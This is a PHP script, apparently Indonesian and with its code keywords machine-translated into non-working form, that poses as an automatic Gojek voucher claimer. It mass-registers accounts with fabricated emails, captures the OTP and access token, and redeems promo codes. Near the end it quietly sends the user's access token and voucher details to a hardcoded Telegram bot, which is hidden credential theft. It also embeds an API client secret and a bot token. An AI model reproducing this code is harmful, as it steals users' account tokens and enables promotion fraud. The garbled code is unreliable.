<? php
date_default_timezone_set ( 'Asia / Jakarta' );
termasuk  "function.php" ;
 warna gema ( "hijau" , "=================================== \ n" );
 warna gema ( "hijau" , "Voucher Klaim \ n" );
 warna gema ( "hijau" , "Buat & Tukarkan Voucher Otomatis \ n" );
 warna gema ( "hijau" , "=================================== \ n" );
echo  "Dibuat oleh: ARKHA AULYAN AZZAM \ n" ;
echo  "Versi: ARKHA AULYAN AZZAM \ n" ;
gema  "Waktu:" . date ( 'dmY || H: i: s' ). "\ n" ;
 warna gema ( "hijau" , "=================================== \ n" );

// perubahan fungsi () {
        $ nama = nama ();
        $ email = str_replace ( "" , "" , $ nama ). mt_rand ( 100 , 999 );
        ulang:
         warna gema ( "nevy" , "?] Nomor:" );
        // $ no = trim (fgets (STDIN));
        $ nohp = trim ( fgets ( STDIN ));
        $ nohp = str_replace ( "62" , "62" , $ nohp );
        $ nohp = str_replace ( "(" , "" , $ nohp );
        $ nohp = str_replace ( ")" , "" , $ nohp );
        $ nohp = str_replace ( "-" , "" , $ nohp );
        $ nohp = str_replace ( "" , "" , $ nohp );

        if (! preg_match ( '/ [^ + 0-9] /' , trim ( $ nohp ))) {
            if ( substr ( trim ( $ nohp ), 0 , 3 ) == '62' ) {
                $ hp = trim ( $ nohp );
            }
            lain  jika ( substr ( trim ( $ nohp ), 0 , 1 ) == '0' ) {
                $ hp = '62' . substr ( trim ( $ nohp ), 1 );
			}
			lain  jika ( substr ( trim ( $ nohp ), 0 , 2 ) == '62' ) {
				$ hp = '6' . substr ( trim ( $ nohp ), 1 );
			}
			selain itu {
				$ hp = '1' . substr ( trim ( $ nohp ), 0 , 13 );
			}
		}
		
		$ data = '{"email": "' . $ email . '@ gmail.com", "name": "' . $ nama . '", "phone": "+' . $ hp . '", " signed_up_country ":" ID "} ' ;
        $ register = request ( "/ v5 / customers" , null , $ data );
        if ( strpos ( $ register , '"otp_token"' )) {
			$ otptoken = getStr ( '"otp_token": "' , '"' , $ register );
			 warna gema ( "hijau" , "+] kode verifikasi telah dikirim" ). "\ n" ;
			otp:
			 warna gema ( "nevy" , "?] OTP:" );
			$ otp = trim ( fgets ( STDIN ));
			$ data1 = '{"client_name": "gojek: cons: android", "data": {"otp": "' . $ otp . '", "otp_token": "' . $ otptoken . '"}, " client_secret ":" 83415d06-ec4e-11e6-a41b-6c40088ab51e "} ' ;
			$ verif = permintaan ( "/ v5 / pelanggan / telepon / verifikasi" , null , $ data1 );
			if ( strpos ( $ verif , '"access_token"' )) {
				 warna gema ( "hijau" , "+] Daftar Sukses \ n" );
				$ token = getStr ( '"access_token": "' , '"' , $ verif );
				$ uuid = getStr ( '"resource_owner_id":' , ',' , $ verif );
				 warna gema ( "hijau" , "+] Token akses Anda:" . $ token . "\ n \ n" );
				save ( "token.txt" , $ token );
				
				 warna gema ( "hijau" , "\ n =========== (REDEEM VOUCHER) ===========" );
				gema  "\ n" . warna ( "kuning" , "!] Klaim Voc GOFOOD A" );
				gema  "\ n" . warna ( "kuning" , "!] Harap tunggu ..." );
				untuk ( $ a = 1 ; $ a <= 3 ; $ a ++) {
					 warna gema ( "kuning" , "." );
					tidur ( 1 );
				}
				$ code1 = permintaan ( '/ promosi-pergi / v1 / promosi / pendaftaran' , $ token , '{"promo_code": "COBAGOFOOD160420A"}' );
				$ message = fetch_value ( $ code1 , '"message": "' , '"' );
				if ( strpos ( $ code1 , 'Anda dapat menggunakan promo ini sekarang ...' )) {
					gema  "\ n" . color ( "green" , "+] Pesan:" . $ message );
					goto goride;
				} lain {
					gema  "\ n" . color ( "red" , "-] Pesan:" . $ message );
					
					gema  "\ n" . warna ( "kuning" , "!] Klaim Voc GOFOOD B" );
					gema  "\ n" . warna ( "kuning" , "!] Harap tunggu ..." );
					untuk ( $ a = 1 ; $ a <= 3 ; $ a ++) {
						 warna gema ( "kuning" , "." );
						tidur ( 1 );
					}
					tidur ( 3 );
					$ boba10 = permintaan ( '/ promosi-pergi / v1 / promosi / pendaftaran' , $ token , '{"promo_code": "COBAGOFOOD160420B"}' );
					$ messageboba10 = fetch_value ( $ boba10 , '"message": "' , '"' );
					if ( strpos ( $ boba10 , 'Anda dapat menggunakan promo ini sekarang ...' )) {
						gema  "\ n" . color ( "green" , "+] Pesan:" . $ messageboba10 );
						goto goride;
					} lain {
						gema  "\ n" . color ( "red" , "-] Pesan:" . $ messageboba10 );
					}
					goride:
					gema  "\ n" . color ( "yellow" , "!] Klaim Voc burger orins" );
					gema  "\ n" . warna ( "kuning" , "!] Harap tunggu ..." );
					untuk ( $ a = 1 ; $ a <= 3 ; $ a ++) {
						 warna gema ( "kuning" , "." );
						tidur ( 1 );
					}
					tidur ( 3 );
					$ goride = permintaan ( '/ pergi-promosi / v1 / promosi / pendaftaran' , $ token , '{"promo_code": "COBAINGOPAY"}' );
					$ message1 = fetch_value ( $ goride , '"message": "' , '"' );
					gema  "\ n" . color ( "green" , "+] Pesan:" . $ message1 );
							
					gema  "\ n" . warna ( "kuning" , "!] Klaim Voc UPNORMAL" );
					gema  "\ n" . warna ( "kuning" , "!] Harap tunggu ..." );
					untuk ( $ a = 1 ; $ a <= 3 ; $ a ++) {
						 warna gema ( "kuning" , "." );
						tidur ( 1 );
					}
					tidur ( 3 );
					$ goride1 = permintaan ( '/ promosi-pergi / v1 / promosi / pendaftaran' , $ token , '{"promo_code": "HEPIUPNORMAL"}' );
					$ Message2 = fetch_value ( $ goride1 , ' "message": "' , '"' );
					gema  "\ n" . color ( "green" , "+] Pesan:" . $ message2 );
					tidur ( 3 );
					
					$ cekvoucher = request ( '/ gopoints / v3 / wallet / voucher? limit = 10 & halaman = 1' , $ token );
					$ total = fetch_value ( $ cekvoucher , '"total_vouchers":' , ',' );
					$ voucher3 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "3" );
					$ voucher1 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "1" );
					$ voucher2 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "2" );
					$ voucher4 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "4" );
					$ voucher5 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "5" );
					$ voucher6 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "6" );
					$ voucher7 = getStr1 ( '"title": "' , '",' , $ cekvoucher , "7" );
					gema  "\ n" . warna ( "kuning" , "-> Total voucher" . $ total . ":" );
					gema  "\ n" . warna ( "hijau" , "1." . $ voucher1 );
					gema  "\ n" . warna ( "hijau" , "2." . $ voucher2 );
					gema  "\ n" . warna ( "hijau" , "3." . $ voucher3 );
					gema  "\ n" . warna ( "hijau" , "4." . $ voucher4 );
					gema  "\ n" . warna ( "hijau" , "5." . $ voucher5 );
					gema  "\ n" . warna ( "hijau" , "6." . $ voucher6 );
					gema  "\ n" . warna ( "hijau" , "7." . $ voucher7 );
					gema "\ n" ;
					$ expired1 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '1' );
					$ expired2 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '2' );
					$ expired3 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '3' );
					$ expired4 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '4' );
					$ expired5 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '5' );
					$ expired6 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '6' );
					$ expired7 = getStr1 ( '"expiry_date": "' , '"' , $ cekvoucher , '7' );
					$ TOKEN   = "1032900146: AAE7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ" ;
					$ chatid = "785784404" ;
					$ pesan  	= "[+] Info Akun Gojek [+] \ n \ n" . $ token . "\ n \ nTotalVoucher =" . $ total . "\ n [+]" . $ voucher1 . "\ n [+] Exp: [" . $ kedaluwarsa1 . "] \ n [+]" . $ voucher2 . "\ n [+] Exp: [" . $ kedaluwarsa2 . "] \ n [+]" . $ voucher3 . "\ n [+] Exp: [" . $ kedaluwarsa3 . "] \ n [+]" ."\ n [+] Exp: [" . $ kedaluwarsa4 . "] \ n [+]" . $ voucher5 . "\ n [+] Exp: [" . $ kedaluwarsa5 . "] \ n [+]" . $ voucher6 . "\ n [+] Exp: [" . $ kedaluwarsa6 . "] \ n [+]" . $ voucher7 . "\ n [+] Exp: [" . $ kedaluwarsa7 . "]" ;
					$ method 	= "sendMessage" ;
					$ url     = "https://api.telegram.org/bot" . $ TOKEN . "/" . $ method ;
					$ post = [ 'chat_id' => $ chatid , 'text' => $ pesan ];
					$ header = [ "X-Diminta-Dengan: XMLHttpRequest" ,
						"Agen-Pengguna: Mozilla / 5.0 (X11; Linux x86_64) AppleWebKit / 537.36 (KHTML, seperti Gecko) Chrome / 51.0.2704.84 Safari / 537.36" ];
					$ ch = curl_init ();
						curl_setopt ( $ ch , CURLOPT_RETURNTRANSFER , 1 );
						curl_setopt ( $ ch , CURLOPT_URL , $ url );
						curl_setopt ( $ ch , CURLOPT_HTTPHEADER , $ header );
						curl_setopt ( $ ch , CURLOPT_POSTFIELDS , $ post );   
						curl_setopt ( $ ch , CURLOPT_SSL_VERIFYPEER , false );
					$ data = curl_exec ( $ ch );
					$ error = curl_error ( $ ch );
					$ status = curl_getinfo ( $ ch , CURLINFO_HTTP_CODE );
						curl_close ( $ ch );
					$ debug [ 'text' ] = $ pesan ;
					$ debug [ 'response' ] = json_decode ( $ data , true );
				}
			} lain {
				 warna gema ( "merah" , "-] Kode yang Anda masukkan salah" );
				 warna gema ( "hijau" , "\ n =================================== \ n \ n" );
				 warna gema ( "kuning" , "!] Silakan masukan lagi \ n" );
				pergi otp;
            }
		} lain {
			 warna gema ( "merah" , "-] Nomor ini sudah terdaftar" );
			 warna gema ( "hijau" , "\ n =================================== \ n \ n" );
			 warna gema ( "kuning" , "!] Silakan daftar lagi menggunakan nomor lain \ n" );
			goto ulang;
        }
//}
// gema perubahan (). "\ n";
